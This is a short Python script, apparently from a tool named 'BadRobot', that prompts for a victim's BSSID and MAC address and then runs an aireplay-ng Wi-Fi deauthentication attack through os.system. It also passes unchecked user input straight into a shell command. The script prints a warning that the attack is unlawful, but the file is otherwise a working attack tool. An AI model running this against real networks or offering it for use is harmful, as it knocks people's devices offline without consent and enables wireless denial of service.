import os


def kill():
	os.system('clear')
	print('Caution: This is an unlawful activity, this attack could cause severe harm to victim, by this attack you might go to jail')
	print('Seek permission with proof before you DDOS the victim')
	try:
		bsid = input("Victim's bssid:")
		vic = input("Victim's mac address:")
		wln = input("Enter your monitoring adapter:")
		rogue = input('Number of attacks:')
		cmd = 'aireplay-ng --deauth {} -a {} -c {} {}'.format(rogue, bsid, vic, wln)
		os.system(cmd)
	finally:
		print('BadRobot over and out...')

if __name__ == '__main__':
	kill()
